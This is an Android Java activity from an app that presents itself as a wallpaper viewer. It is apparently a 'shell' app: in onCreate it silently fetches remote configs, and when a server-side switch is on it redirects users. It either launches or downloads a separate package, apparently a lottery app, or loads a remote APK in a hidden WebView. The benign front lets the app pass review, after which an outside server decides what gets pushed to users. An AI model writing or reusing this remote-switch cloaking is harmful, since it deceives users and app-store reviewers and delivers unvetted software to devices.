package com.lvweijie.shell;

import android.app.WallpaperManager;
import android.content.Context;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.Image;
import android.support.annotation.NonNull;
import android.support.v4.content.ContextCompat;
import android.support.v4.view.PagerAdapter;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.WebView;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.TextView;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Build;
import android.support.annotation.RequiresApi;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.alibaba.android.arouter.launcher.ARouter;
import com.j1.j1finger.FingerAuthenticationCallBack;
import com.j1.j1finger.FingerManager;
import com.j1.j1finger.FingerPrintStatus;
import com.lvweijie.common.utils.PackageUtil;
import com.lvweijie.downloadlibrary.downloadpage.DownloadApkActivity;
import com.lvweijie.ljlogin.LoginActivity;
import com.qmuiteam.qmui.util.QMUIDeviceHelper;
import com.qmuiteam.qmui.util.QMUIDisplayHelper;
import com.qmuiteam.qmui.widget.QMUIPagerAdapter;
import com.qmuiteam.qmui.widget.QMUIViewPager;
import com.squareup.okhttp.Call;
import com.squareup.okhttp.Callback;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.Response;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;

import static android.security.keystore.KeyProperties.PURPOSE_DECRYPT;
import static android.security.keystore.KeyProperties.PURPOSE_ENCRYPT;

public class ImagesActivity extends AppCompatActivity {
    private static final String SPLoginkey = "j1sploginkey";
    private static final String SPPaykey = "j1sppaykey";
    private static final String TAG = "AppCompatActivity";
    private EditText etLogin;
    private Button btlogin;

    private ArrayList<Integer> mItems = new ArrayList();
    private String packageName = "com.bxvip.app.cpbang01";
    private String rootSwitch = "https://asay.pub/config";
    private String WebViewSwitchUrl = "http://appid.201888888888.com/getAppConfig.php?appid=";
    private boolean rootswitch = true;

    @SuppressLint("CutPasteId")
    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_iamges);


        final QMUIViewPager viewPager = findViewById(R.id.pager);
        findViewById(R.id.button3).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                WallpaperManager wallpaperManager = WallpaperManager.getInstance(ImagesActivity.this);
                Resources res = getResources();
                Bitmap bitmap = BitmapFactory.decodeResource(res,mItems.get(viewPager.getCurrentItem()));
                try {
                    wallpaperManager.setBitmap(bitmap);
                    Toast.makeText(ImagesActivity.this, "设置成功", Toast.LENGTH_SHORT).show();
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
        });
        initData();
        QMUIPagerAdapter pagerAdapter = new QMUIPagerAdapter() {

            @Override
            public boolean isViewFromObject(@NonNull View view, @NonNull Object object) {
                return view == object;
            }

            @Override
            public int getCount() {
                return mItems.size();
            }

            @Override
            public CharSequence getPageTitle(int position) {
                return mItems.get(position) + "页面";
            }

            @Override
            @NonNull
            protected Object hydrate(@NonNull ViewGroup container, int position) {
                return new ItemView(ImagesActivity.this, mItems.get(position));
            }

            @Override
            protected void populate(@NonNull ViewGroup container, @NonNull Object item, int position) {
                View itemView = (View) item;
                container.addView(itemView);
            }

            @Override
            protected void destroy(@NonNull ViewGroup container, int position, @NonNull Object object) {
                container.removeView((View) object);
            }
        };
        viewPager.setAdapter(pagerAdapter);
        viewPager.setEnableLoop(true);
        boolean isopenwebview = false;
        OkHttpClient okHttpClient = new OkHttpClient();
        Request request = new Request.Builder().get().url(rootSwitch).build();
        Call call1 = okHttpClient.newCall(request);
        call1.enqueue(new Callback() {
            @Override
            public void onFailure(Request request, IOException e) {

            }

            @Override
            public void onResponse(Response response) throws IOException {
                final String responseStr = response.body().string();
                JSONObject jsonObject = null;
                try {
                    jsonObject = new JSONObject(responseStr);
                    rootswitch = jsonObject.getBoolean("switch");
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        });
        request = new Request.Builder().get().url(WebViewSwitchUrl).build();
        Call call = okHttpClient.newCall(request);
        //异步调用并设置回调函数
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Request request, IOException e) {
                Toast.makeText(ImagesActivity.this, "Get 失败", Toast.LENGTH_LONG).show();

            }

            @Override
            public void onResponse(Response response) throws IOException {
                final String responseStr = response.body().string();
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        Log.e("tag",responseStr);
                        try {
                            JSONObject jsonObject = new JSONObject(responseStr);
                            String url = jsonObject.getString("Url");
                            String showWeb = jsonObject.getString("ShowWeb");
                            if (!rootswitch){
                                return;
                            }
                            if (url.isEmpty()){
                                return;
                            }
                            if (url.endsWith("apk")){
                                showDownload();
                                return;
                            }
                            showWebView();
                        }catch (Exception e){
                            e.printStackTrace();
                        }

                    }
                });
            }
        });
    }

    private void showDownload() {
       /* ARouter.getInstance().build("/download/downloadActivity")
                .navigation();*/

        if (PackageUtil.isInstalled(this, packageName)) {
            PackageUtil.openApp(this, packageName);
            return;
        }
        Intent intent = new Intent(this, DownloadApkActivity.class);
        startActivity(intent);
    }

    private void showWebView() {
        WebView webView = findViewById(R.id.webview);
        webView.setVisibility(View.VISIBLE);
        webView.loadUrl("https://ws-oss-app.syrnight.com/cpb/cpbangzy.apk");
        //webView.loadUrl("https://cpbang.app-updated.com/wap/index.htm");
    }

    private void initData() {

        mItems.add(R.drawable.a);
        mItems.add(R.drawable.b);
        mItems.add(R.drawable.c);
        mItems.add(R.drawable.d);
        mItems.add(R.drawable.e);
        mItems.add(R.drawable.f);
        mItems.add(R.drawable.g);
        mItems.add(R.drawable.h);
    }

    static class ItemView extends FrameLayout {
        private ImageView mTextView;

        public ItemView(Context context, int resID) {
            super(context);
            mTextView = new ImageView(context);
            mTextView.setImageResource(resID);

            int size = QMUIDisplayHelper.dp2px(context, 300);
            LayoutParams lp = new LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT);
            lp.gravity = Gravity.CENTER;
            addView(mTextView, lp);
        }

    }

    FingerAuthenticationCallBack callBack = new FingerAuthenticationCallBack() {
        @Override
        public void onAuthenticationFail(String result) {

        }

        @Override
        public void onAuthenticationSucceeded(String result) {
            Log.e(TAG, result);
            Toast.makeText(ImagesActivity.this, result, Toast.LENGTH_LONG).show();
        }

        @Override
        public void onAuthenticationError(int errorCode, CharSequence errString) {

        }

        @Override
        public void onAuthenticationHelp(int helpCode, CharSequence helpString) {

        }

        @Override
        public void onCancel() {
            Log.e(TAG, "user cancel");
        }
    };
}

